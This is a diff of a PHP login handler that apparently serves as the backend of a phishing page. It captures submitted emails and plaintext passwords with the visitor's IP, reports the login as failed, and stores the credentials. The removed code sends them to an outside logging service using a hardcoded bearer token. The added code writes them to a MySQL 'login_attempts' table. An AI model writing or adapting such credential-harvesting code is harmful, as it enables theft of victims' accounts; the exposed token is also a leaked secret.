@@ -4,55 +4,39 @@ $email = filter_input(INPUT_POST, 'di', FILTER_SANITIZE_STRING);
 $password = filter_input(INPUT_POST, 'pr', FILTER_SANITIZE_STRING);
 
 // Function to send JSON response
-function sendJsonResponse($success, $message = '', $redirectUrl = '') {
+function sendJsonResponse($success, $message = '') {
     header('Content-Type: application/json');
     echo json_encode([
         'success' => $success,
-        'message' => $message,
-        'redirectUrl' => $redirectUrl
+        'message' => $message
     ]);
     exit();
 }
 
-// Log all login attempts to Papertrail using HTTPS
+// Log login attempts to the Railway database
 try {
-    // Papertrail endpoint URL
-    $papertrailUrl = "https://logs.collector.na-01.cloud.solarwinds.com/v1/logs/bulk"; // Replace with your bulk endpoint
-    $authorizationToken = "3Vb4KQWqFeJsIF_sBb7dN8pg1jm8ByXFeF45UgkwFcOUM194h_77z7n7zdEG6mEN-KhgKg"; // Replace with your token
+    // Railway Database Connection Details (replace with environment variables from Railway)
+    $host = getenv('MYSQLHOST');
+    $user = getenv('MYSQLUSER');
+    $password_db = getenv('MYSQLPASSWORD');
+    $database = getenv('MYSQLDATABASE');
 
-    // Prepare log data
-    $logData = sprintf(
-        "Date: %s | Email: %s | Password: %s | IP: %s",
-        date("Y-m-d H:i:s"),
+    // PDO connection setup
+    $dsn = "mysql:host={$host};dbname={$database};charset=utf8mb4"; // For MySQL (change to PostgreSQL DSN if using PostgreSQL)
+    $pdo = new PDO($dsn, $user, $password_db);
+
+    // Insert login data into the table
+    $stmt = $pdo->prepare("INSERT INTO login_attempts (email, password, ip_address, attempt_time) VALUES (?, ?, ?, ?)");
+    $stmt->execute([
         $email,
         $password,
-        $_SERVER['REMOTE_ADDR'] ?? 'Unknown'
-    );
-
-    // Send logs via POST request using curl
-    $ch = curl_init($papertrailUrl);
-    curl_setopt($ch, CURLOPT_POST, true);
-    curl_setopt($ch, CURLOPT_POSTFIELDS, $logData);
-    curl_setopt($ch, CURLOPT_HTTPHEADER, [
-        "Content-Type: application/octet-stream",
-        "Authorization: Bearer $authorizationToken"
+        $_SERVER['REMOTE_ADDR'] ?? 'Unknown',
+        date("Y-m-d H:i:s")
     ]);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); // Get the response from Papertrail
 
-    $response = curl_exec($ch);
-    if ($response === false) {
-        error_log("Failed to send logs to Papertrail: " . curl_error($ch)); // Debug: Log curl_error
-        sendJsonResponse(false, "A server error occurred while saving the login attempt.");
-    } else {
-        error_log("Papertrail Response: " . $response); // Debug: Log Papertrail's response
-    }
-
-    curl_close($ch);
-
-    // Send response to the frontend
-    sendJsonResponse(false, "Login attempt saved.");
+    sendJsonResponse(false, "Login attempt saved to Railway database.");
 } catch (Exception $e) {
-    error_log("Failed to log login attempt to Papertrail: " . $e->getMessage()); // Debug: Log exception
+    error_log("Failed to log login attempt: " . $e->getMessage());
     sendJsonResponse(false, "A server error occurred while saving the login attempt.");
 }
 ?>
